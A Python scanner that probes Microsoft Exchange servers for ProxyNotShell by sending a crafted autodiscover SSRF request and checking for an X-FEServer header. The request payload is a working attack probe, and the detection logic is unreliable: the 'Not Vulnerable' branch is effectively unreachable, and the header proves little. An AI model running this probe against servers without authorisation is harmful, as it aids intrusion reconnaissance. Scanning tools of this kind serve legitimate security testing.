import argparse, sys, requests
import random
from time import sleep
from urllib3 import disable_warnings
import urllib

def scanner(url):
    vulnParm = "/autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
    }
    r = requests.get("{}{}".format(url, vulnParm),
                     headers=headers, verify=False, timeout=30)
    try:
        if r.headers['X-FEServer'] is not None:
           print(bcolor.BLUE + "[+] {} vulnerable to ProxyNotShell.".format(url))
        else:
           print('[-] {} Not Vulnerable'.format(url))
    except Exception as KeyError:
      print(bcolor.CRED + "[-] Maybe WAF & Load Balancer Prevent The Exploit")
      print(bcolor.CRED + "[-] or Target Seems to be Not Exchange Server")
disable_warnings()

class bcolor:
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CBLACK = '\33[30m'
    CRED = '\33[31m'
    RED = '\33[31m'
    CGREEN = '\33[32m'
    CYELLOW = '\33[33m'
    CBLUE = '\33[34m'
    BLUE = '\33[34m'
    CVIOLET = '\33[35m'
    CBEIGE = '\33[36m'
    CWHITE = '\33[37m'


def LOGO():
    bcolor_random = [bcolor.CBLUE, bcolor.CVIOLET, bcolor.CWHITE, bcolor.OKBLUE, bcolor.CGREEN, bcolor.WARNING,
                    bcolor.CRED, bcolor.CBEIGE]
    random.shuffle(bcolor_random)
    x = bcolor_random[0] + """
╔═══╗                ╔═╗ ╔╗     ╔╗ ╔═══╗╔╗      ╔╗ ╔╗
║╔═╗║                ║║╚╗║║    ╔╝╚╗║╔═╗║║║      ║║ ║║
║╚═╝║╔═╗╔══╗╔╗╔╗╔╗ ╔╗║╔╗╚╝║╔══╗╚╗╔╝║╚══╗║╚═╗╔══╗║║ ║║
║╔══╝║╔╝║╔╗║╚╬╬╝║║ ║║║║╚╗║║║╔╗║ ║║ ╚══╗║║╔╗║║╔╗║║║ ║║
║║   ║║ ║╚╝║╔╬╬╗║╚═╝║║║ ║║║║╚╝║ ║╚╗║╚═╝║║║║║║║═╣║╚╗║╚╗
╚╝   ╚╝ ╚══╝╚╝╚╝╚═╗╔╝╚╝ ╚═╝╚══╝ ╚═╝╚═══╝╚╝╚╝╚══╝╚═╝╚═╝
                ╔═╝║
                ╚══╝
\n"""

    for c in x:
        print(c, end='')
        sys.stdout.flush()
        sleep(0.0004)
    y = "\t||||||||||||||||||||||||||||||||||||||||||||||||||||||\n"
    for c in y:
        print(bcolor.CRED + c, end='')
        sys.stdout.flush()
        sleep(0.0005)
    y = "\t||                   ProxyNotShell                  ||\n"
    for c in y:
        print(bcolor.CWHITE + c, end='')
        sys.stdout.flush()
        sleep(0.0005)
    x = "\t||                                                  ||\n"
    for c in x:
        print(bcolor.CWHITE + c, end='')
        sys.stdout.flush()
        sleep(0.0005)
    z = "\t||            Made BY: Mohamed Alzhrani             ||\n"
    for c in z:
        print(bcolor.CWHITE + c, end='')
        sys.stdout.flush()
        sleep(0.0005)
    y = "\t||||||||||||||||||||||||||||||||||||||||||||||||||||||\n"
    for c in y:
        print(bcolor.CRED + c, end='')
        sys.stdout.flush()
        sleep(0.0005)
    y = "\t||              http://github.com/MazX0p            ||\n"
    for c in y:
        print(bcolor.CWHITE + c, end='')
        sys.stdout.flush()
        sleep(0.0005)

    y = "\t||||||||||||||||||||||||||||||||||||||||||||||||||||||\n"
    for c in y:
        print(bcolor.CRED + c, end='')
        sys.stdout.flush()
        sleep(0.0065)

def urlfalid(GivenUrl):
    try:
        status = urllib.request.urlopen(GivenUrl).getcode()
        if status == 200:
            scanner(GivenUrl)
        else:
            print(bcolor.CRED + "[-] URL is not work")
    except Exception as KeyError:
        print(bcolor.CRED + "Falied URL")




if __name__ == '__main__':
    LOGO()
    GivenUrl = str(input("\033[35mEnter url \nURL ex -> http://mail.company.net :    >>> \033[0m"))
    urlfalid(GivenUrl)
